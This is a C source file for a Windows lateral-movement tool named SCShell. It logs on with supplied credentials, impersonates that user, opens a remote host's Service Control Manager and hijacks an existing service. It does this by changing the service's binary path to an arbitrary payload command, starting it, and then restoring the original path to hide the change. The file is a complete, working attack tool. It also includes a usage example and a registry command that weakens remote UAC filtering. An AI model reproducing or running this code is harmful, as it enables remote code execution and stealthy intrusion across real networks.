#include <windows.h>
#include <stdio.h>

// Usage : .\scshell.exe MALDEV01 maldev DESKTOP-P94FCS 192.168.101.129 XblAuthManager "C:\Windows\System32\cmd.exe /c echo DONE > C:\done.txt"

// Remote UAC filtering needed for testing if you are using remote machine or testing it out
// reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

typedef WINBOOL (WINAPI* LOGONUSERA) (LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
typedef WINBOOL (WINAPI* IMPERSONATELOGGEDONUSER) (HANDLE hToken);
typedef SC_HANDLE (WINAPI* OPENSCMANAGERA)(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
typedef SC_HANDLE (WINAPI* OPENSERVICEA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess);
typedef WINBOOL (WINAPI* QUERYSERVICECONFIGA)(SC_HANDLE hService,LPQUERY_SERVICE_CONFIGA lpServiceConfig,DWORD cbBufSize,LPDWORD pcbBytesNeeded);
typedef WINBOOL (WINAPI* CHANGESERVICECONFIGA)(SC_HANDLE hService,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword,LPCSTR lpDisplayName);
typedef WINBOOL (WINAPI* STARTSERVICEA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR *lpServiceArgVectors);
typedef WINBOOL (WINAPI* CONTROLSERVICE)(SC_HANDLE hService,DWORD dwControl,LPSERVICE_STATUS lpServiceStatus);
typedef HGLOBAL (WINAPI* GLOBALALLOC) (UINT uFlags, SIZE_T dwBytes);


int main(int argc, char **argv)
{

    if ( argc < 7 )
    {
        printf("[+] ScShell \n");
        printf("[!] Usage %s <username> <password> <domain/machine_name> <IP> <service_name> <Payload>", argv[0]);
        ExitProcess(0);
    }

    printf("[+] Resolving API's \n");

    LOGONUSERA p_LogonUserA = (LOGONUSERA)GetProcAddress(LoadLibrary("Advapi32.dll"), "LogonUserA");
    IMPERSONATELOGGEDONUSER p_ImpersonateLoggedOnUser = (IMPERSONATELOGGEDONUSER)GetProcAddress(LoadLibrary("Advapi32.dll"), "ImpersonateLoggedOnUser");
    OPENSCMANAGERA p_OpenSCManagerA = (OPENSCMANAGERA)GetProcAddress(LoadLibrary("Advapi32.dll"), "OpenSCManagerA");
    OPENSERVICEA p_OpenServiceA = (OPENSERVICEA)GetProcAddress(LoadLibrary("Advapi32.dll"), "OpenServiceA");
    QUERYSERVICECONFIGA p_QueryServiceConfigA = (QUERYSERVICECONFIGA)GetProcAddress(LoadLibrary("Advapi32.dll"), "QueryServiceConfigA");
    CHANGESERVICECONFIGA p_ChangeServiceConfigA = (CHANGESERVICECONFIGA)GetProcAddress(LoadLibrary("Advapi32.dll"), "ChangeServiceConfigA");
    STARTSERVICEA p_StartServiceA = (STARTSERVICEA)GetProcAddress(LoadLibrary("Advapi32.dll"), "StartServiceA");
    CONTROLSERVICE p_ControlService = (CONTROLSERVICE)GetProcAddress(LoadLibrary("Advapi32.dll"), "ControlService");
    GLOBALALLOC p_GlobalAlloc = (GLOBALALLOC)GetProcAddress(LoadLibrary("kernel32.dll"), "GlobalAlloc");


    // LPSTR = CHAR *something
    CHAR *username = argv[1];
    CHAR *password = argv[2];
    CHAR *domain = argv[3];
    CHAR *target = argv[4];
    CHAR *service = argv[5];
    CHAR *payload = argv[6];
    HANDLE hToken = NULL;
    SC_HANDLE scHandle = NULL;
    BOOL bResult = FALSE;
    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    DWORD dwSize = 0;
    DWORD dwSizeSecond = 0;

    CHAR *orginallpBinaryPathName = NULL;

    bResult = p_LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
    if ( !bResult )
    {
        printf("LogonUserA Failed Error : %d \n", GetLastError());
        ExitProcess(0);
    }

    printf("LogonUserA succeed 0x%p \n", hToken);

    bResult = p_ImpersonateLoggedOnUser(hToken);
    if ( !bResult )
    {
        printf("ImpersonateLoggedOnUser Failed Error : %d \n", GetLastError());
        ExitProcess(0);
    }

    printf("ImpersonateLoggedOnUser succeed 0x%p \n", hToken);

    scHandle = p_OpenSCManagerA(target, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if ( scHandle == NULL )
    {
        printf("OpenSCManagerA Failed Error : %d \n", GetLastError());
        ExitProcess(0);
    }

    SC_HANDLE scService = p_OpenServiceA( scHandle, service, SERVICE_ALL_ACCESS  );
    if ( scService == NULL )
    {
        printf("OpenServiceA Failed Error : %d \n", GetLastError());
        ExitProcess(0);
    }

    printf("OpenServiceA succeed 0x%p \n", scService);

    p_QueryServiceConfigA( scService, NULL, 0, &dwSize );
    printf("LPQUERY_SERVICE_CONFIGA size is %d bytes \n", dwSize);

    lpqsc = p_GlobalAlloc(GPTR, dwSize);

    bResult = p_QueryServiceConfigA( scService, lpqsc, dwSize, &dwSizeSecond );
    if ( bResult == 0 )
    {
        printf("QueryServiceConfigA Failed Error : %d \n", GetLastError());
        ExitProcess(0);
    }

    // Here we will get "C:\Windows\system32\svchost.exe -k netsvcs -p"
    printf("%s \n", lpqsc->lpBinaryPathName);

    orginallpBinaryPathName = lpqsc->lpBinaryPathName;

    // Stop the service first (error 1062 = already stopped, that's fine)
    SERVICE_STATUS svcStatus;
    p_ControlService(scService, SERVICE_CONTROL_STOP, &svcStatus);
    printf("Stopping service... Error : %d \n", GetLastError());
    Sleep(3000);

    // Changing the Remote Service Path
    p_ChangeServiceConfigA(scService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    printf("Changing the Remote Path to -> %s \n", payload);

    // Starting the Service
    p_StartServiceA(scService, 0, NULL);

    bResult = GetLastError();
    printf("The Error of the Result is %d \n", bResult);

    // Restoring it back
    p_ChangeServiceConfigA(scService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, orginallpBinaryPathName, NULL, NULL, NULL, NULL, NULL, NULL);
    printf("Restored path is -> %s \n", orginallpBinaryPathName);

    // Cleanup
    GlobalFree(lpqsc);
    CloseHandle(hToken);
    CloseServiceHandle(scHandle);

    return 0;
}
